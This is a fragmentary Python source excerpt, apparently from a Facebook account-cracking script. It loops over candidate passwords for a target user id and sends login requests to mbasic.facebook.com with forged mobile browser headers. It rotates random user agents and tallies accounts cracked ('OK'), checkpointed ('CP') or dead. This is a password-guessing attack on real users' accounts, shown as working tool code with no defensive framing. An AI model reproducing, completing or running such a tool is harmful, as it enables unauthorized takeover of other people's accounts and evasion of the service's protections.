...
def mbasic(uid,pwx,tl):
    ...
    try:
        for pw in pwx:
            ...
            'Host': 'mbasic.facebook.com',
            'content-length': '506',
            'sec-ch-ua': '"Not.A/Brand";v="12", "Chromium";v="113", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?1',
            ...
            'x-asbd-id': '129477',
            'x-requested-with': 'mark.via.gp',
            'sec-ch-ua-full-version-list': '"Not.A/Brand";v="14.0.0.0", "Chromium";v="111.0.3775.265", "Google Chrome";v="110.0.5865.39"',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua-platform': '"Android"',
            'accept': '*/*',
            ...
            'referer': 'https://mbasic.facebook.com/login/device-based/login/async/',
...
def x(uid,pwx,tl):
    ...
    global loop
    global bkas
    sys.stdout.write(f"\r {green}(M3)-({loop})-(OK {len(oks)})-(CP {len(cps)})-(DIE {len(die)})-(NV {len(nv)})\r"),
    sys.stdout.flush()
    try:
        for pw in pwx:
            ua = random.choice(uas)
